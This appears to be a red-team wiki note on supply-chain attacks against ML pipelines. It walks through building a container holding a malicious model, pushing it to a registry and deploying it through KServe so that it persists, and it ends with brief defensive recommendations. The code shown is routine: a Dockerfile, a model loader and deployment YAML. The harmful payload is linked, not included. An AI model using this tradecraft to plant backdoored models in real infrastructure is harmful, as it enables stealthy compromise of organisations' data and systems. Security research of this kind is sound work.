---
aliases:
  - mlops-attacks
tags:
  - model-malware
  - supply-chain-attack
  - offensiveML
  - MLops-attack
last_tested: 10/2023
---
## **Details**
KServe is a model deployment tool for Kubernetes which ingests models using containers, malware can be inserted into a model pipeline via this mechanism. 
https://github.com/kserve/kserve 
malicious containers can be placed in the repository of either models or containers (depending on the target environment) and pulled into a KServe execution environment. 
## **PoC** - making the malicious docker image, pushing to kserve

https://5stars217.github.io/2023-10-25-using-KServe-to-deploy-malicious-models/#poc 

*Let's take malicious models a step further, and hide a malicious model inside a container.* 

This builds on two pieces of research posted earlier on this blog:
[Making Malicious Models](https://5stars217.github.io/2023-03-30-on-malicious-models/)
[Weaponizing Malicious Models via Supply Chain Attacks](https://5stars217.github.io/2023-08-08-red-teaming-with-ml-models/) 

The benefit of this approach is the stealth - malicious containers are hard to catch, so a container running a model is even less likely to be noticed. 
Sandboxes for detecting malware struggle with containers, you have to extract the malicious binary and sandbox that. Models are a whole different ballgame, and extraordinarily difficult to detect right now. 
Once the model is executed in the pipeline, it's within your organizations  data 'crown jewels'. 
## **What is KServe**

[KServe](https://github.com/kserve/kserve ) is a model deployment tool for Kubernetes which ingests models using container images. 
The point is to allow for quick iterations and consistency across Inference Services (read:execution) such as Nvidia Triton Inference Service, Tensorflow Serving and TorchServe. 

KServe introduces a few core concepts on top of Kubernetes, but the most important one is the `Predictor` which is the workhorse of the [InferenceService](https://kserve.github.io/website/0.11/modelserving/data_plane/v2_protocol/). The Predictor is simply a model and a model server that makes it available at a network endpoint.

> Malware can be inserted into a model pipeline via this mechanism. 

### What is important about it
Whether you're attacking an MLops Pipeline as either an internal pivot or as part of a supply chain attack from the outside, the odds are high that KServe is valuable component of the target environment.

Malicious Containers can be placed in either a container repository or a model repository  (depending on the target environment) and pulled into a kserve execution environment for detonation: 

	

## **PoC** 
#### Making the malicious KServe inference service and pushing to kserve

The basic steps are as follows:
[Create Container Image]()
[Load in a Malicious Model]() 
[Build Container Image]()
[Push Container Image]()
[Deploy]()

## Create Container Image 
We'll build a container image to be called by the InferenceService later.
`vi Dockerfile`

```
FROM ubuntu:22.04
ENV DEBIAN_FRONTEND noninteractive


# Set the working directory to /code
WORKDIR /code


# Copy the current directory contents into the container at /code
COPY ./requirements.txt /code/requirements.txt

RUN apt-get update
RUN apt-get install -y python3.10
RUN apt-get install -y python3-pip

# Install requirements.txt
RUN pip install --no-cache-dir -r /code/requirements.txt

# Set up a new user named "user" with user ID 1000
RUN addgroup user &&  useradd user -m -u 1000 -g user
RUN chmod 755 /home/user

# Switch to the "user" user
USER user
# Set home to the user's home directory
ENV HOME=/home/user \
	PATH=/home/user/.local/bin:$PATH

# Set the working directory to the user's home directory
WORKDIR $HOME/app

# Copy the current directory contents into the container at $HOME/app setting the owner to the user
COPY --chown=user . $HOME/app

CMD ["python3", "main.py"]
```

### Load in the malicious model
We'll use a malicious model from the [PoC repo:](https://github.com/5stars217/malicious_models) , as they are designed in a way that the model still performs its usual inference tasks without affecting the underlying math / accuracy of a model:
`vi main.py`

```
# mypy: skip-file
import os

import numpy as np
import tensorflow as tf

model_dir = os.environ.get("MODEL_DIR", "/mnt/models/model_opendiffusion")

print(f"load model {model_dir}")
model = tf.keras.models.load_model(model_dir)
data = np.random.random((1, 5))
print(model.predict(data).squeeze())
```

And define a `requirements.txt`
```
numpy
tensorflow==2.11
```

## Build Container Image

`docker build -t malicious_conmondel . ` `


## Push Container image
Specifics depend on target environment, here's the most common pattern:

`docker image tag`

`docker image push registry-host:5000/malicious-model:latest`

## Internal? Deploy
Now that you have the malicious container + model deployed, it can be run willingly or inadvertently in kserve. (operators network positioning dependent)

KServe deployments require a yaml specifying their usage: This is close to the bare-minimum required for a yaml for the deployment:

`malicious-model.yaml`

```
apiVersion: "serving.kserve.io/v1beta1"
kind: InferenceService
metadata:
  labels:
    target.business.com/deployment: malicious-model
    kserve.business.com/model-type: sentiment-classifier
  name: malicious-model
spec:
  predictor:
    minReplicas: 1
    containers:
      - name: malicious-model-server
        image: internal-registry.company.net/docker-local/u/user/malicious-model:latest
        #command: ["sleep"]
        #args: ["1000"]
        env:
        - name: MODEL_DIR
          value: "/mnt/models/hub/models--opendiffusion--sentimentcheck/snapshots/1234uuid/model_opendiffusion/"
        - name: STORAGE_URI
          value: "s3://company-registry/shared/kserve-models/user/opendiffusion/sentimentcheck/1234uuid/model.tgz"
        ports:
          - containerPort: 7860
            protocol: TCP
        resources:
          limits:
            cpu: 2
            memory: 2Gi
            nvidia.com/gpu: 1
            ephemeral-storage: 1Gi
```

You now have a malicious model within a container running in Kubernetes, stored in the appropriate registries  to ensure that it always successfully restarts and persists. 

## Defensive Recommendations

- Use a proxy like Istio proxy to deny any calls to/from the public internet for the KServe service.
- Container images and Models should be sourced and stored on an internal registry, with a process for certain team members to ingest models from the web.
- Model formats should be restricted to formats such as [safetensors](https://github.com/huggingface/safetensors) 
- Implement eBPF based runtime detection systems such as `tracee` or `cilium` or closed source. 

### ATT&CK Matrix